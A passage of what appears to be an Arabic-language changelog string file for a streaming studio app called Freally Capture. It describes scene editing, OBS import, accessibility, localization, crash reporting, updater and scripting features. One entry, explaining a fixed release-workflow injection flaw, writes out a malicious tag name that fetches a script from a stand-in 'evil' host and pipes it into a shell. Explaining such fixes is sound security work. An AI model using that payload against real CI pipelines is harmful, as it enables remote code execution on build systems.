<em>يُراقَب</em>: عرض متعدد لكل مشهد، وأجهزة عرض بملء الشاشة لأي مشهد / مصدر / برنامج / معاينة على أي شاشة، والتقاط صورة ثابتة بلا فقدان بمفتاح واحد. وأخيرًا، ينفتح على العالم الذي جاء منه — باستيراد مجموعة مشاهد OBS، والعثور على الوسائط التي نُقلت.","changelog.7219ebda2472":"<strong>تراجع/إعادة متعددا الخطوات لكل تعديل للمشهد</strong> (CAP-M01). سجل لقطات محدود ومُعنوَن يعمل تحت القفل نفسه الذي تعمل تحته المجموعة؛ والإيماءة المتواصلة (سحب، أو تحريك fader) تُدمج في خطوة واحدة؛ ويعكس <code>Ctrl</code>/<code>Cmd</code>+<code>Z</code> التعديلات — لا العرض المباشر أبدًا (فاختيار مشهد البرنامج، وتوسيط العرض، والتركيز تبقى خارج المكدس). وتعرض قائمة سجل قابلة للعرض ما ستتراجع عنه كل خطوة بالضبط.","changelog.aae31a6bbe7f":"<strong>أداة استيراد مجموعات مشاهد OBS</strong> (CAP-M02). وجّهها إلى ملف <code>scenes.json</code> من OBS فتنقل المشاهد، وترتيب الطبقات (z-order)، والرؤية/القفل/المزج لكل عنصر، ومصادر اللون/النص/الصورة/الوسائط، والتقاطات الشاشة/النافذة/الكاميرا/الصوت، والمشاهد المتداخلة، وفلاتر الفيديو <strong>و</strong>الصوت التي تتعرّف عليها — ثم تعيد <strong>تقريرًا صادقًا لكل مصدر</strong>: ما انتقل سليمًا، وما يحتاج إلى إعادة اختيار جهاز الالتقاط الخاص به، وما يشير إلى ملف ينبغي التحقق منه، وما لم يكن له مقابل فتُخطّي. تُقدَّر أحجام العناصر ومواضعها من تخطيط OBS (فملف المشهد لا يحمل الأحجام الأصلية للمصادر ولا اللوحة)، والتقرير يذكر ذلك.","changelog.d6bb32be4ef4":"<strong>مُعالِج الملفات المفقودة</strong> (CAP-M03). عند التحميل — أو عند الطلب من لوحة الأوامر — يفحص المجموعة بحثًا عن مسارات الصور / الوسائط / الخطوط / LUT / الأقنعة التي لم تعد تشير إلى ملف موجود، ويعرض إعادة ربط كلٍّ منها. إصلاح مسار معطوب واحد يُصلح كل مشهد استخدمه؛ و«تحديد الموقع في مجلد…» يطابق دفعةً واحدة حسب الاسم.","changelog.6f96fd6fdf78":"<strong>تحديد متعدد كامل للمحاذاة</strong> (CAP-M04). يحدد النقر مع Shift وإطار التحديد المطاطي عناصر كثيرة؛ اسحب أيًّا منها لنقل المجموعة (مع الالتقاط كصندوق واحد)؛ وحاذِ حوافها/مراكزها بعضها مع بعض أو وزّعها بالتساوي. ويمكنك سحب <strong>خطوط أدلة</strong> خاصة بك — اسحب للنقل، واسحب خارج اللوحة للحذف — تلتقط إليها العناصر المسحوبة، وتُرسم فوق معاينة JPEG ومعاينة GPU الأصلية كلتيهما.","changelog.13b73aeb27b0":"<strong>لوحة تحويل دقيقة مع النسخ/اللصق</strong> (CAP-M05). اكتب موضع العنصر نسبةً إلى نقطة الارتكاز، وحجمه، ودورانه، واقتصاصه؛ وانسخ تحويلًا أو سلسلة فلاتر كاملة والصقها على عنصر آخر كخطوة تراجع واحدة.","changelog.5b8587772325":"<strong>منضدة عمل للمفاتيح</strong> (CAP-M26). اضبط مفتاح كروما/لون/إضاءة مقابل عرض مباشر لمصدر واحد مع وضع القناع (ألفا ← رمادي)، وقطّارة ألوان، وعدسة مكبّرة، وفاصل قبل/بعد قابل للسحب.","changelog.630487ce7411":"<strong>شاشة مراقبة بعرض متعدد</strong> (CAP-M06) — شبكة مباشرة لكل مشهد مع مؤشر تالي أحمر (البرنامج) / أخضر (المعاينة)، انقر للقطع أو (في وضع الاستوديو) للتجهيز في المعاينة. ويمكن فتحها في نافذة مستقلة على أي شاشة.","changelog.cfb92d0b5e04":"<strong>أجهزة عرض لأي شيء وفي أي مكان</strong> (CAP-M07) — اعرض بملء الشاشة البرنامج، أو معاينة وضع الاستوديو، أو <strong>مشهدًا محددًا</strong>، أو <strong>مصدرًا واحدًا</strong> على أي شاشة متصلة (أو في نافذة عائمة). وتُفتح أجهزة العرض مجددًا حيث تركتها عند التشغيل التالي.","changelog.d31889806a32":"<strong>التقاط صورة ثابتة بمفتاح واحد</strong> (CAP-M08) — صورة PNG بلا فقدان للبرنامج (أو لمصدر واحد، قبل الفلاتر أو بعدها) تُحفظ في مجلد التسجيلات، ويمكن ربطها باختصار عام.","changelog.77c37009de86":"أصبح تحديد المشهد تحديدًا متعددًا أصيلًا في كامل المعاينة؛ ويُثبّت التحويل الجماعي عمليات المحاذاة / التوزيع / نقل المجموعة كخطوة تراجع واحدة.","changelog.f1cc3f1d7724":"اكتسبت قناة <code>preview://</code> خانات أجهزة عرض بالدقة الكاملة لكل هدف وتوجيهًا لأجهزة العرض لكل مشهد، إلى جانب الخانات الموجودة للبرنامج / المعاينة / الرأسي / منضدة العمل / العرض المتعدد؛ ويبقى CORS مقصورًا على أصول التطبيق نفسه.","changelog.e27bd21b1216":"[0.96.0] — 2026-07-10 (إمكانية الوصول، و18 لغة، والإعداد الأولي، والسمات)","changelog.dfb83dff1086":"المرحلة 9: لمسات الإطلاق الأخيرة. أصبح الاستوديو يتحدث ثماني عشرة لغة، ويمكن تشغيله بالكامل من لوحة المفاتيح ومسموعًا لقارئ الشاشة، ويهيّئ نفسه عند التشغيل الأول، ويمكن إلباسه سمة فاتحة.","changelog.ed8d27bca3a0":"اثنان من الأخطاء أدناه كانا سيُشحنان في 1.0.0 ويستحقان الذكر، لأن كليهما كان غير مرئي أثناء المراجعة وكليهما أصبح الآن مضبوطًا بفحص آلي (lint) أو اختبار بدلًا من الاعتماد على الذاكرة. كانت السمة الفاتحة مُصلحة نصف إصلاح فقط — فالوضع الداكن يبدو مثاليًا سواء أكان للسطح تجاوز للسمة الفاتحة أم لا، لذا تجتاز عناصر التحكم البيضاء على خلفية بيضاء مراجعة الشيفرة في كل مرة. كما أن الترقية من 0.95.1 كانت ستعيد تشغيل معالج التشغيل الأول، الذي يُسقط قالبه المبدئي التقاطًا ثانيًا للشاشة على المشهد الذي رتّبه مستخدم حالي من قبل.","changelog.245328562168":"<strong>الاستوديو يتحدث 18 لغة</strong> (TASK-902) — <code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>، من فهرس Fluent يضم <strong>989 مفتاحًا</strong>. يتبع التثبيت الجديد لغة نظام التشغيل؛ والاختيار الصريح هو الذي يُعتمد. تُفعّل العربية <code>&lt;html dir=&quot;rtl&quot;&gt;</code>. والإنجليزية طبقة أساس تحت كل لغة، لذا يُعرض المفتاح الذي لم يصل إليه المترجم بالإنجليزية بدلًا من معرّف خام. يُفشل <code>npm run i18n:lint</code> التكامل المستمر (CI) عند وجود مفتاح ناقص، أو مفتاح يتيم، أو مكرر، أو <code>t(&quot;…&quot;)</code> لا يشير إلى شيء.","changelog.c9eb7215afcc":"يُثبت فحص التكافؤ أن الفهارس الـ18 متفقة <em>فيما بينها</em>؛ لكنه لا يقول شيئًا عن وجود نصوص التطبيق فيها. وتسدّ ثلاث بوابات إضافية هذه الفجوة: اختبار يتحقق من أن كل مدخل في جدول التسميات يُحَل، وفحص للمفاتيح التي لا يشير إليها شيء، وفحص لاستدعاءات <code>t()</code> على مستوى الوحدة — إذ من شأنها أن تجمّد النص على اللغة التي كانت محمّلة عند الاستيراد ولا تعيد ترجمته أبدًا.","changelog.060a09e005da":"<strong>معالج تشغيل أول يهيّئ الجهاز الذي يعمل عليه فعلًا</strong> (TASK-903، TASK-905). يحصي وحدات GPU والأنوية الفعلية، ويرتّب المُرمِّزات العتادية المتاحة، ويقترح مُرمِّزًا ولوحة ومعدل fps ومعدل بت <em>مع ذكر السبب بلغة المستخدم</em>. ويُتخطى المُرمِّز الذي رفضه برنامج التشغيل من قبل بدلًا من التوصية به. القبول بنقرة واحدة؛ وكذلك الإبقاء على إعداداتك. ويُعدّ التخطي إنهاءً — فلا يعود المعالج أبدًا.","changelog.62ba4a6d41af":"<strong>لوحة أوامر</strong> على <code>Ctrl</code>/<code>Cmd</code>+<code>K</code> (TASK-904)، تطابق التسلسلات الجزئية، لذا يعثر <code>ssc</code> على «Start Screen Capture» (بدء التقاط الشاشة).","changelog.925da222cab8":"<strong>نافذة إعدادات واحدة وصفحة «حول»</strong> (TASK-906، TASK-907) — اللغة والسمة ورصيف الإحصاءات في مكان واحد؛ والإصدار وبيانات البناء الوصفية والتراخيص وأداة الإبلاغ عن الأخطاء في الأخرى.","changelog.bece666d04b9":"<strong>سمات فاتحة ومخصصة.</strong> لون التمييز خاصية CSS مخصصة يُتحقق من أنها بصيغة <code>#rrggbb</code> على جانبي حدود IPC، لأن أي نص يُكتب في ورقة أنماط هو منفذ محتمل للحقن.","changelog.dd70fb65720c":"<strong>أصبح التنقل في الاستوديو ممكنًا دون ماوس أو شاشة</strong> (TASK-901). كل محطة توقف للوحة المفاتيح ترسم حلقة تركيز مرئية؛ ومربعات الحوار تحبس <code>Tab</code> وتعيد التركيز إلى حيث أخذته؛ وأصبح <code>aria-modal</code> مدعومًا بحبس حقيقي لا بمجرد وعد. ويُعلَن بدء البث المباشر، والتسجيل، وإعادة الاتصال، وفقدان ثانية من الفيديو بسبب الإطارات المُسقَطة لقارئات الشاشة عبر منطقة <code>aria-live</code>. ويُحترم إعداد «تقليل الحركة» في نظام التشغيل.","changelog.ff6f0dc97e11":"<strong>لم تعد الترقية تعيد تشغيل معالج التشغيل الأول.</strong> الحقل <code>completedOnboarding</code> جديد، والمفتاح المفقود قيمته الافتراضية <code>false</code>، لذا كان كل تثبيت قائم سيُستقبل بمعالج يضيف قالبه المبدئي التقاط شاشة <em>ثانيًا</em> فوق المشهد الذي رتّبه المستخدم من قبل. أصبحت ملفات الإعدادات تُرحَّل عند التحميل: فالملف الأقدم من هذا الحقل الذي سبق أن قَبِل اتفاقية ترخيص (EULA) قد جرى تشغيله من قبل بوضوح. والمعيار هو <em>غياب</em> الحقل، لا كونه قيمة خاطئة — فمن يخرج في منتصف المعالج كتب <code>false</code> عن قصد ويجب أن يراه مجددًا.","changelog.5cf1579964ec":"<strong>لم تعد السمة الفاتحة تعرض أبيض على أبيض.</strong> تُرسم اللوحات بلون <em>أبيض</em> شبه شفاف فوق لون قريب من الأسود، ولا يستطيع متغير CSS الوصول إلى داخل فئة أداة مثل <code>bg-white/10</code>، لذا تعيد السمة الفاتحة تلوين أسماء تلك الفئات بأسود شبه شفاف. وقد فاتت ست منها: شارات الكتم/البوابة في المازج، وشارة REC، ومسارات أشرطة تقدّم التنزيل، وشارات الحالة، ونقطة «انتهى» في رصيف الإحصاءات، وخط الاقتباس في اتفاقية الترخيص. وأصبح <code>npm run theme:lint</code> يُفشل CI عند أي فئة أداة بيضاء شفافة ليس لها تجاوز للسمة الفاتحة ولا مدخل في قائمة السماح يوضح لماذا يجوز أن تبقى بيضاء.","changelog.b78b64a1e1a5":"<strong>لم يعد اختيار لون التمييز يرمي مستخدم السمة الفاتحة في الظلام.</strong> كانت عيّنة اللون تفرض السمة «مخصص» كي «تعمل» من أي وضع، لكن «مخصص» قائمة على الداكنة — فأي تعديل طفيف للون كان يتخلص من «فاتح» بصمت. وبدلًا من ذلك، أصبحت العيّنة معطَّلة خارج «مخصص».","changelog.7d0190596194":"<strong>لم تعد قارئات الشاشة تُعلن عن دفعة إطارات مُسقَطة عند كل إعادة اتصال.</strong> عدد الإطارات المُسقَطة تراكمي ويواصل الارتفاع خلال الانقطاع، لذا كانت أول نبضة حالة بعد العودة إلى الهواء تُقارَن بخط الأساس السابق للانقطاع فتُعلن الانقطاع كله كدفعة جديدة — فوق إعلانَي «إعادة الاتصال» و«مباشر» اللذين سمعهما المستمع من قبل.","changelog.a83950358bea":"<strong>لم يعد فشل حفظ الإعدادات يتخلص من إعداد غير ذي صلة.</strong> كان التراجع يستعيد لقطة الإعدادات كاملة التي التُقطت عند عرض مربع الحوار، لذا كان الحفظ الفاشل قد يُلغي إعدادًا <em>آخر</em> نجح في الأثناء. وبدلًا من ذلك، يُعاد الآن قراءة المخزن.","changelog.aac84f9f1108":"<strong>أصبح لتسجيلات <code>.frec</code> أيقونتها الخاصة في المستكشف.</strong> لا يحتوي مخطط <code>fileAssociations</code> في Tauri على حقل <code>icon</code>، ويثبّت قالب NSIS الخاص به <code>DefaultIcon</code> للاقتران على الملف التنفيذي للتطبيق، لذا كان كل تسجيل يُظهر أيقونة الاستوديو بينما بقي <code>icons/frec.ico</code> دون استخدام في مجلد التثبيت. يعيد الخطاف <code>NSIS_HOOK_POSTINSTALL</code> كتابة <code>DefaultIcon</code> الخاص بـ ProgId بعد كتابة الاقتران، ويرسل الإشارة <code>SHCNE_ASSOCCHANGED</code> ليعيد المستكشف الرسم دون تسجيل الخروج. <em>(على Windows؛ لا يزال <code>.icns</code> في macOS وحزمة MSI يُظهران أيقونة التطبيق — وهما متابعتان منفصلتان.)</em> لاحظ أن الاقتران يُسجَّل بواسطة <strong>المُثبِّت</strong>، لذا يُظهر ملف <code>.frec</code> الأيقونة العامة حتى يُثبَّت Freally Capture بدلًا من تشغيله من مجلد بناء.","changelog.64cdb0e5fc96":"[0.95.1] — 2026-07-09 (الإبلاغ عن الانهيارات، وحفظ قبول اتفاقية الترخيص، وإصلاحات مربعات الحوار)","changelog.ec29332c27cd":"ستة أخطاء اكتُشفت أثناء التمرّن على مسار الإبلاغ عن الأخطاء على عتاد حقيقي — اثنان منها كانا سيُشحنان في 1.0.0 — إضافةً إلى أعمال الإبلاغ عن الانهيارات والمُحدِّث التي تطلبتها تلك التمارين. أصبح الانهيار الآن يخبرك بأنه وقع ويعيد الاستوديو والتقرير مفتوح فيه مسبقًا.","changelog.a70a547d08ad":"<strong>أصبح الانهيار يخبرك بأنه وقع، ويعيد الاستوديو.</strong> لا يستطيع التطبيق المنهار عرض نافذة الخطأ الخاصة به، لذا يُطلق خطاف الذعر (panic hook) الملف التنفيذي نفسه كأداة مساعدة صغيرة خالية من Tauri (<code>--crash-notice &lt;pid&gt;</code>)، تعرض مربع حوار أصليًا يقول «توقف Freally Capture بشكل غير متوقع»، وتنتظر حتى تغادر العملية المنهارة جدول العمليات، ثم تعيد التشغيل. ويعرض الاستوديو المُعاد فتحه التقرير المُنقّى تلقائيًا. والانتظار أساسي: فإعادة التشغيل بينما لا تزال بقايا العملية تمسك قفل النسخة الواحدة تدمج التشغيل الجديد في التطبيق المنهار ولا تترك أي استوديو على الإطلاق.","changelog.71da0a3520ee":"<strong>لم يعد قبول اتفاقية الترخيص (EULA) يُلغي نفسه.</strong> يقرأ <code>App.tsx</code> الإعدادات <em>و</em>حالة اتفاقية الترخيص عند التحميل، لذا تسبق لقطة الإعدادات القبول؛ فكان تغيير أي إعداد في الجلسة نفسها يكتب القيمة القديمة <code>acceptedEulaVersion: null</code> فوقه، فتعود البوابة عند التشغيل التالي. وكان ملف تعريف محفوظ قبل القبول يفعل الشيء نفسه. أصبح <code>SettingsStore::set()</code> يحافظ على الحقل، و<code>accept_eula()</code> هو الوحيد الذي يكتبه.","changelog.327bad332e86":"<strong>كانت مربعات الحوار محبوسة داخل رصيفها.</strong> تجعل <code>backdrop-blur</code> الخاصة بـ <code>Panel</code> منه الكتلة الحاوية لـ <code>position: fixed</code>، لذا كانت طبقة <code>PickerShell</code> تتوسط داخل صندوق الرصيف بدلًا من النافذة — فكان 16 من 19 مربع حوار، ومنها <em>تحقّق من التحديثات</em>، يُعرض جزئيًا خارج الشاشة وأزراره بعيدة المنال. أصبح <code>PickerShell</code> يُعرض عبر بوابة (portal) إلى <code>document.body</code>.","changelog.05a8d823f564":"<strong>كانت تقارير الانهيار المُرسلة بالبريد الإلكتروني لا تفتح شيئًا بصمت.</strong> كان طول عنوان URL محدودًا بعدد الأحرف، لكن ترميز النسبة المئوية (percent-encoding) يضخّم الحرف ذا الثلاثة بايتات تسعة أضعاف — فأنتج تتبّع خلفي حقيقي رابط <code>mailto:</code> بطول ~7800 حرف، متجاوزًا حد ShellExecute في Windows البالغ ~2048، فيُفتح نافذة فارغة دون الإبلاغ عن أي خطأ. أصبح الحد الآن على <strong>عنوان URL بأكمله</strong> (المخطط، والعنوان، والموضوع، والنص معًا)، ويُطبَّق على الطول بعد الترميز، ولا يقسم الاقتطاع أي تسلسل هروب أبدًا. ولم يكن تقييد النص وحده كافيًا: فالموضوع نص من المستخدم، و80 حرفًا من CJK تُرمَّز إلى 720 بايت، لذا كان تقرير بغير الإنجليزية يصل مع ذلك إلى ~2285 حرفًا.","changelog.b0d9792ddddb":"<strong>كان ذعران متزامنان يُظهران مربعَي حوار للانهيار.</strong> لا يوقف <code>panic = &quot;abort&quot;</code> كل شيء في الحال، لذا كان بإمكان خيطين أن يشغّل كلٌّ منهما الخطاف. أصبح الإشعار يُطلَق مرة واحدة على الأكثر لكل عملية.","changelog.6747e7604c73":"<strong>كانت أداة إشعار الانهيار المساعدة التي لا تملك pid قابلًا للقراءة تعيد التشغيل فورًا</strong>، مباشرةً إلى سباق النسخة الواحدة الذي وُجدت لتجنّبه. وأصبحت الآن تنتظر فترة ثابتة بدلًا من ذلك.","changelog.c52ec7fca94b":"<strong>كانت القوائم المنسدلة تبقى مفتوحة عند النقر خارجها.</strong> أصبحت قائمة <strong>+</strong> في شريط المصادر وقائمتا <em>إضافة فلتر</em> كلتاهما تُغلق عند النقر خارجها أو بالضغط على Escape. ويُغلق Escape العنصر الأعمق فقط، لذا تحتاج القائمة داخل مربع حوار إلى ضغطة لإخفائها وثانية لإغلاق مربع الحوار.","changelog.ceb3ac683c32":"<strong>إنشاء في Gmail</strong> إلى جانب زر عميل البريد الموجود — https عادي، دون مفتاح API، ولا شيء يُرسل تلقائيًا؛ ويصادف المستخدم غير المسجّل دخوله شاشة تسجيل الدخول في Google ثم يعود إلى المسودة المُعبّأة مسبقًا.","changelog.3ed3900cea6b":"<strong>تحمل تقارير الانهيار وقت حدوثها</strong>، بالتوقيت المحلي للمستخدم مع إزاحة UTC الخاصة به وبتوقيت UTC. الإزاحة معرِّف ضعيف للهوية، وهي موثّقة بوصفها الاستثناء المقصود الوحيد من قاعدة التقرير «لا معرّفات شخصية»؛ ويقرأ المستخدم النص بالضبط قبل الإرسال.","changelog.2757df14a536":"<strong>يتحقق الاستوديو من التحديثات مرة واحدة عند التشغيل</strong> ويعرض الإصدار الجديد، ورقمه، وملاحظات الإصدار من هذا الملف في حقل للقراءة فقط، مع خيار صريح بنعم/لا. لتقرير الانهيار المعلّق الأولوية دائمًا في خانة مربع الحوار؛ وينتظر التحديث حتى التشغيل التالي. وتبقى عمليات التحقق دون اتصال أو المقيّدة بحد المعدل صامتة. أصبح <code>latest.json</code> يحمل قسم الإصدار من <code>CHANGELOG.md</code> بوصفه <code>notes</code>.","changelog.0ceef8bf9dbd":"أصبحت تحديثات Windows تشغّل معالج NSIS (<code>installMode: basicUi</code>) لتعرض صفحة الإنهاء <strong>تشغيل Freally Capture</strong> ومربع اختيار لاختصار سطح المكتب، بدلًا من إعادة التشغيل بصمت. كما يحمل المُثبِّت أيقونة التطبيق (<code>nsis.installerIcon</code>) بدلًا من الأيقونة الافتراضية في NSIS.","changelog.04d1725214c0":"قسم <strong>الاختبار</strong> في مربع حوار الإبلاغ عن الأخطاء (<em>محاكاة تقرير انهيار</em>، <em>فرض انهيار تجريبي</em>) وأمرا IPC الخاصان به. لا مكان لعنصر تحكم «يُسقط التطبيق» في استوديو مباشر؛ ويُتمرَّن على الحلقة باستخدام علامة التشغيل <code>--test-crash</code>، التي لا زر لها ولا أمر خلفها.","changelog.6bd81d475bf0":"<strong>سير عمل الإصدار: حقن أوامر shell عبر اسم الوسم.</strong> كان <code>${{ github.ref_name }}</code> يُستوفى مباشرةً في كتل <code>run:</code>، لذا كان GitHub يدمج الوسم في <em>الشيفرة المصدرية</em> لـ shell قبل أن يحللها bash. تمنع أسماء المراجع المسافات لكنها تسمح بـ <code>&quot;</code> و<code>;</code> و<code>$</code> وعلامات الاقتباس المائلة (backticks)، ويوفّر <code>${IFS}</code> المسافة — فوسم مثل <code>v1&quot;;curl${IFS}evil|sh;&quot;</code> كان سيُنفَّذ. أصبح الوسم يصل إلى السكربت عبر <code>env:</code>، كبيانات. وكان استغلاله يتطلب صلاحية دفع الوسوم، لذا فهذا دفاع في العمق.","changelog.81cccf7322b4":"أصبحت خطوة <code>actions/checkout</code> في مهمة الإصدار تضبط <code>persist-credentials: false</code>. فهي تملك <code>contents: write</code> ولا تقرأ سوى <code>CHANGELOG.md</code>؛ وترك <code>GITHUB_TOKEN</code> في <code>.git/config</code> كان سيمنح أي حقن مستقبلي طريقًا جاهزًا للدفع.","changelog.25ca7c7f85dd":"أصبح <code>PRIVACY.md</code> ينص بوضوح على أن التحقق من التحديثات يعمل <strong>مرة واحدة عند كل تشغيل</strong> لا عند الطلب فقط، وأنه لا يرسل أي شيء عن المستخدم — إذ كانت الصياغة السابقة تقول إن كل طلب شبكة «يبدأ بإجراء منك»، وهو ما جعله التحقق الجديد عند بدء التشغيل غير صحيح.","changelog.46a767ffc1f9":"[0.95.0] — 2026-07-08 (التقاط الألعاب، والتوزيع، وصوت كل تطبيق — المرحلة 8)","changelog.599aa55a76f0":"تحديث تلقائي موقّع ومستضاف ذاتيًا، والتقاط الصوت لكل تطبيق، ونقطة ربط (seam) لبيئة تشغيل NDI، ونقطة ربط لالتقاط الألعاب تنبّه بصدق إلى خطر أنظمة مكافحة الغش، وبوابة اتفاقية الترخيص عند التشغيل الأول، وفيديو داخل البث لمقاطع التفاعل/النقد — واجهة المرحلة 8 «نحو 1.0.0»، كلها محلية ومعطَّلة افتراضيًا.","changelog.5903d686ccbb":"أُضيف — المرحلة 8","changelog.eb682bb7ec7d":"<strong>مُحدِّث تلقائي موقّع ومستضاف ذاتيًا</strong> (TASK-803) — يتحقق التطبيق من ملف <code>latest.json</code> موقّع على نقطة نهاية إصدارات GitHub، ويتحقق من كل تنزيل مقابل مفتاح minisign عام مدمج في الملف الثنائي قبل تطبيقه (تُرفض الحزمة غير الموقّعة أو المعبوث بها). <strong>⭳ تحقّق من التحديثات…</strong> في رصيف عناصر التحكم — لا يُنزَّل شيء دون نقرة؛ ويُعاد تشغيل التطبيق لإتمام العملية. يوقّع خط أنابيب الإصدار كل حزمة ويُنشئ <code>latest.json</code>؛ وتوقيع Developer-ID والتوثيق (notarization) لـ macOS موصولان ومشروطان بالأسرار (ترقية بشهادة مدفوعة، دون تغيير في سير العمل). راجع <code>design/updater-signing.md</code>.","changelog.883b1ffbdb75":"<strong>التقاط الصوت لكل تطبيق</strong> (TASK-805) — التقط صوت تطبيق واحد كمصدر مستقل في المازج. يبدأ بـ Windows عبر <strong>حلقة العملية (process loopback)</strong> في WASAPI (<code>ActivateAudioInterfaceAsync</code> على الجهاز الافتراضي لحلقة العملية، Win10 2004+)؛ والشيفرة <code>unsafe</code> الخاصة بـ COM معزولة في الحزمة (crate) الجديدة <code>fcap-appaudio</code> كي تبقى <code>fcap-audio</code> على <code>#![forbid(unsafe_code)]</code>. ويحصل على شريط مازج كامل (VU، وfader، وكتم، ومراقبة، وفلاتر، ومسار). يعرض Linux/macOS إرشادات صادقة لكل نظام تشغيل. المصادر ◂ <strong>صوت التطبيق</strong>.","changelog.56b6b2b908a6":"<strong>نقطة ربط التقاط الألعاب + تنبيه صادق بشأن مكافحة الغش/برامج مكافحة الفيروسات</strong> (TASK-801) — «التقاط لعبة» (حقن خطاف DX/GL/Vulkan) <strong>مرحلة مُعلَّمة</strong> اختيارية: لا يحقن التطبيق أي شيء بصمت أبدًا، ويعرض <strong>خطر الحظر</strong> من أنظمة مكافحة الغش + خطر برامج مكافحة الفيروسات قبل أي خطاف. والمسار العامل اليوم — <strong>التقاط نافذة</strong> (بلا حدود/في نافذة) — موصى به لكل نظام تشغيل (Wayland ← البوابة). المصادر ◂ <strong>التقاط لعبة (اقرأ أولًا)</strong>.","changelog.ec03a805ba49":"<strong>نقطة ربط بيئة تشغيل NDI</strong> (TASK-804) — يكتشف مخرج NDI الاختياري بيئة تشغيل NDI التي ثبّتها المستخدم (ولا تُضمَّن أبدًا) عبر متغيرات البيئة الموثّقة + المجلدات الافتراضية ويختبر ربطها؛ وعلامة المخرج المُنمَّطة مشروطة بذلك الاكتشاف. يرتبط إرسال الإطارات بترويسات NDI SDK المجانية (متابعة مُسمّاة). يُعرض للقراءة فقط في المكوّنات ◂ <strong>تكاملات اختيارية</strong>.","changelog.eaa0871281d1":"<strong>بوابة قبول اتفاقية الترخيص (EULA) عند التشغيل الأول</strong> — لا يُعرض الاستوديو حتى يُقبل إصدار اتفاقية الترخيص الحالي (مرّر للقراءة ثم <strong>أوافق</strong> / <strong>رفض وخروج</strong>)؛ ويُحفظ القبول، ولا يُطلب مجددًا إلا عند تغيّر إصدار اتفاقية الترخيص. يُضمَّن <code>EULA.md</code> وقت البناء، لذا فالنص المقبول هو بالضبط ما يُشحن.","changelog.52426b69775a":"<strong>فيديو داخل البث (تفاعل/نقد)</strong> — ضمّن فيديو في المشهد و<strong>أوقفه مؤقتًا/استأنفه مباشرةً</strong> أثناء التعليق عليه، ثم أزله — يتوقف صوت مصدر الوسائط ويُستأنف في المزيج مع الصورة (⏸/▶ على مصادر الوسائط).","changelog.082d1c8d5bec":"<strong>تنزيل المكوّنات داخل التطبيق</strong> — أصبح تنزيل ffmpeg عند الطلب يعرض نسبة مئوية صريحة على غرار <code>98.35%</code> بجوار شريط التقدّم + الإلغاء. ويُنزّل مكوّن جديد هو <strong>بيئة تشغيل مصدر المتصفح (Chromium/CEF)</strong> بيئة تشغيل CEF بحجم ~100 MB بالطريقة الصادقة نفسها: يحدد أحدث بناء مستقر من فهرس بناءات CEF الرسمي، و<strong>يتحقق من التنزيل مقابل SHA-1 الوارد في ذلك الفهرس قبل فك الضغط</strong> (دون تضمين، ودون قيمة تجزئة مثبّتة في الشيفرة)، ويخزّنه مؤقتًا لكل مستخدم — بواجهة النسبة/الشريط/الإلغاء نفسها. أما <em>مصدر</em> المتصفح الذي يُعرض عبر بيئة التشغيل فهو مرحلة متابعة مستقلة؛ وهذا الإصدار يشحن تنزيل بيئة التشغيل.","changelog.1dc8ae2f6900":"نطاق مُحدَّد بصدق (المرحلة 8)","changelog.158788627266":"<strong>VST2/3</strong> (TASK-804) — مؤجَّل خلف علامة: لم تعد Steinberg تمنح ترخيص VST2 SDK، وVST3 مرخّص بـ GPLv3 أو بترخيص تجاري، وكلاهما يتعارض مع بناء بتكلفة $0 ودون تراخيص إضافية. ومجموعة فلاتر DSP المملوكة (إزالة الضوضاء، والبوابة، والضاغط، والمُحدِّد، والمُعادِل، والكسب، والخفض التلقائي) هي البديل المشحون.","changelog.c436d24d7e3a":"<strong>حقن خطاف GPU لالتقاط الألعاب</strong> و<strong>إرسال إطارات NDI</strong> هما مرحلتا المتابعة المُسمّاتان اللتان صُممت نقاط الربط أعلاه لتكون مستقرة من أجلهما.","changelog.8843550dc6eb":"[0.90.0] — 2026-07-08 (التحكم عن بُعد، والسكربتات، والإضافات — واجهة قابلية التوسعة)","changelog.a7f6a66abff0":"تحكّم في الاستوديو من Stream Deck، واستجب لبدء البث بسكربت، وضمّن رصيف دردشة، ووسّع التطبيق بإضافة — واجهة قابلية التوسعة في المرحلة 7، وكلها <strong>محلية ومعطَّلة افتراضيًا</strong>.","changelog.3f14c1391b04":"أُضيف — قابلية التوسعة (المرحلة 7)","changelog.cc7d3cbcb365":"<strong>واجهة API للتحكم عن بُعد عبر WebSocket</strong> (TASK-701) — اتصال WebSocket محمي بكلمة مرور تتصل به وحدة تحكم على طراز Stream Deck / Companion: بدّل المشاهد، وشغّل الانتقال، وابدأ البث والتسجيل أو أوقفهما، واحفظ الإعادات، واضبط الكتم/مستويات الصوت — الإجراءات نفسها المتاحة في الواجهة، لا أكثر (لا يمكنها قراءة الملفات). <strong>معطَّلة افتراضيًا</strong>؛ ولا ترتبط إلا بـ <code>127.0.0.1</code> ما لم تُفعَّل الشبكة المحلية صراحةً؛ والتعطيل يعني أن المنفذ مغلق. المصادقة بأسلوب التحدي والاستجابة — فلا تعبر كلمة المرور الشبكة أبدًا. الإعدادات ← عناصر التحكم ← <strong>⌁ عن بُعد…</strong>.","changelog.155aa02952b7":"<strong>أرصفة المتصفح</strong> (TASK-702) — افتح نافذة دردشة منبثقة، أو صفحة تنبيهات، أو أزرار Companion على الويب في نافذة مستقلة بجوار الاستوديو (http/https فقط؛ لا يملك الرصيف أي وصول إلى التطبيق، بل يعرض المحتوى فحسب). عناصر التحكم ← <strong>⧉ الأرصفة…</strong>.","changelog.3149da08891b":"<strong>سكربتات Lua في بيئة معزولة</strong> (TASK-703) — سكربتات <code>.lua</code> تستجيب لأحداث الاستوديو (بدء البث، وتغيير المشهد، وحالة التسجيل) وتقود واجهة الأوامر نفسها التي تقودها واجهة API البعيدة. لا تملك البيئة المعزولة <strong>أي وصول إلى الملفات أو نظام التشغيل</strong> (لا <code>io</code>/<code>os</code>/<code>require</code>، ومُحمِّلات الشيفرة الثنائية الوسيطة مغلقة)؛ ويبقى خطأ السكربت محصورًا. يعرض <code>scripts/sample.lua</code> واجهة API. عناصر التحكم ← <strong>⚡ السكربتات…</strong>.","changelog.507908bbd502":"<strong>حزمة SDK للإضافات</strong> (TASK-704) — عقود <code>Source</code>/<code>Filter</code> موثّقة + نقطة ربط للسجل، لتتمكن حزمة إضافة (crate) من إضافة مصدر أو فلتر <strong>دون المساس بالنواة</strong>. <code>plugins/checkerboard</code> هو المثال الكامل؛ و<code>design/plugin-sdk.md</code> هو الدليل.","changelog.5c03c1a47d1d":"<strong>صفحة انضمام على الويب لضيوف الهاتف</strong> (TASK-R3) — أصبح رمز QR للدعوة يفتح <code>docs/join.html</code> على موقع Pages: طرف 